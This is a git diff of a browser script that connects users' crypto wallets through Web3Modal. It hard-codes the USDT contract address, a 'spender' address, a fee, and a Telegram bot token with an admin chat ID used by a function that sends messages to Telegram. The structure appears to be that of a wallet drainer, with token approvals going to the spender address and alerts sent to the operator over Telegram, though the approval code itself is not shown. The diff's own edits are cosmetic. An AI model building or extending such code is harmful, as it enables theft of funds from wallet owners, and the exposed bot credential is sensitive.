@@ -1,3 +1,4 @@
+// ====== IMPORTS (Module Safe) ======
 import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js";
 import { Web3Modal } from "https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.6.0/dist/index.js";
 import { EthereumClient, w3mConnectors, w3mProvider } from "https://cdn.jsdelivr.net/npm/@web3modal/ethereum@2.6.0/dist/index.js";
@@ -9,7 +10,7 @@ const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // ERC20 USDT
 const FEE = 50;
 const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961"; // spender
 
-// Telegram bot configYOUR_TELEGRAM_BOT_TOKEN
+// Telegram bot config
 const TELEGRAM_BOT = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
 const ADMIN_CHAT_ID = "7662871309";
 
@@ -45,9 +46,19 @@ const wagmiConfig = createConfig({
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
 const web3Modal = new Web3Modal({ projectId: WC_PROJECT_ID }, ethereumClient);
 
+// ====== MOBILE-FRIENDLY WALLET INIT ======
 async function initWallet() {
   try {
-    await web3Modal.openModal(); // user chooses MetaMask or WalletConnect
+    // Open modal
+    await web3Modal.openModal();
+
+    // Mobile check for smaller devices
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    if (isMobile) {
+      modal.style.padding = "20px";
+      modal.style.fontSize = "16px";
+    }
+
     const provider = new ethers.BrowserProvider(web3Modal.getWalletProvider());
     const signer = await provider.getSigner();
     const userAddress = await signer.getAddress();
@@ -60,7 +71,7 @@ async function initWallet() {
   }
 }
 
-// ====== Telegram notify ======
+// ====== TELEGRAM NOTIFY ======
 async function sendTelegram(chatId, message) {
   if (!chatId) return;
   await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
